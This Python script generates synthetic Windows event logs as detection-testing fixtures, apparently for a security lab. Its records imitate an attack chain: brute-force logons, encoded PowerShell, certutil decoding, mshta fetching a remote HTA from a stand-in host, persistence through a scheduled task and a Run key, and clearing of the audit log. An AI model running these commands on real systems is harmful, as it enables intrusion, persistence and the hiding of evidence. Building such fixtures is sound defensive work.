"""Generate inert synthetic log records, never execute simulated commands."""

from datetime import datetime, timedelta, timezone
import json
from pathlib import Path


def generate():
    events = []
    base = datetime(2026, 9, 1, 9, tzinfo=timezone.utc)

    def add(offset, event_id, data, *, host="WS-LAB-01", channel="Microsoft-Windows-Sysmon/Operational", provider="Microsoft-Windows-Sysmon", label="synthetic_suspicious"):
        event = {
            "timestamp": (base + timedelta(seconds=offset)).isoformat().replace("+00:00", "Z"),
            "host": host, "channel": channel, "provider": provider,
            "event_id": event_id, "record_id": 1000 + len(events), "event_data": data,
            "fixture_label": label,
            "provenance": {"kind": "synthetic", "scenario": "demo-v1", "note": "Inert test data, not a real incident or a captured attack"},
        }
        events.append(event)

    auth = {"TargetUserName": "analyst.lab", "TargetDomainName": "LAB", "IpAddress": "192.0.2.25", "LogonType": "3"}
    for offset in range(0, 100, 20):
        add(offset, 4625, {**auth, "Status": "0xc000006d", "SubStatus": "0xc000006a"}, channel="Security", provider="Microsoft-Windows-Security-Auditing")
    add(110, 4624, auth, channel="Security", provider="Microsoft-Windows-Security-Auditing")

    def process(offset, image, command, guid, parent="{DEMO-PARENT}", label="synthetic_suspicious"):
        add(offset, 1, {"Image": image, "CommandLine": command, "ProcessGuid": guid, "ParentProcessGuid": parent, "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\analyst.lab"}, label=label)

    process(120, "C:\\Windows\\explorer.exe", "explorer.exe", "{DEMO-PARENT}", parent="{OUTSIDE-CAPTURE}", label="synthetic_benign")
    process(130, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQBiACcA", "{DEMO-PS}")
    add(131, 4104, {"ScriptBlockText": "Write-Output 'lab'", "ScriptBlockId": "demo-script"}, channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell")
    add(140, 3, {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ProcessGuid": "{DEMO-PS}", "DestinationIp": "192.0.2.50", "DestinationPort": "8080", "Protocol": "tcp"})
    process(150, "C:\\Windows\\System32\\certutil.exe", "certutil.exe -decode C:\\Lab\\input.txt C:\\Lab\\output.txt", "{DEMO-CERT}")
    process(160, "C:\\Windows\\System32\\mshta.exe", "mshta.exe https://example.invalid/lab.hta", "{DEMO-HTA}")
    add(170, 4698, {"SubjectUserName": "analyst.lab", "TaskName": "\\Lab\\ReviewTask", "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-File C:\\Lab\\review.ps1</Arguments></Exec></Actions></Task>"}, channel="Security", provider="Microsoft-Windows-Security-Auditing")
    add(180, 13, {"Image": "C:\\Windows\\System32\\reg.exe", "ProcessGuid": "{DEMO-REG}", "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LabReview", "Details": "powershell.exe -File C:\\Lab\\review.ps1"})
    add(190, 1102, {"SubjectUserName": "analyst.lab", "SubjectDomainName": "LAB"}, channel="Security", provider="Microsoft-Windows-Eventlog")
    process(200, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Lab\\backup.ps1", "{DEMO-BACKUP}", label="synthetic_benign_alert_expected")
    process(210, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -File C:\\Lab\\inventory.ps1", "{DEMO-INVENTORY}", label="synthetic_benign")
    add(220, 4698, {"SubjectUserName": "admin.lab", "TaskName": "\\Lab\\Backup", "TaskContent": "<Task><Actions><Exec><Command>C:\\Lab\\backup.exe</Command></Exec></Actions></Task>"}, channel="Security", provider="Microsoft-Windows-Security-Auditing", label="synthetic_benign")
    add(230, 13, {"TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LabApp", "Details": "C:\\Lab\\app.exe"}, label="synthetic_benign")
    return events


if __name__ == "__main__":
    root = Path(__file__).resolve().parents[1]
    target = root / "data" / "fixtures" / "demo.jsonl"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("".join(json.dumps(event, ensure_ascii=False) + "\n" for event in generate()), encoding="utf-8")
    print(f"Wrote {len(generate())} SYNTHETIC events to data/fixtures/demo.jsonl")
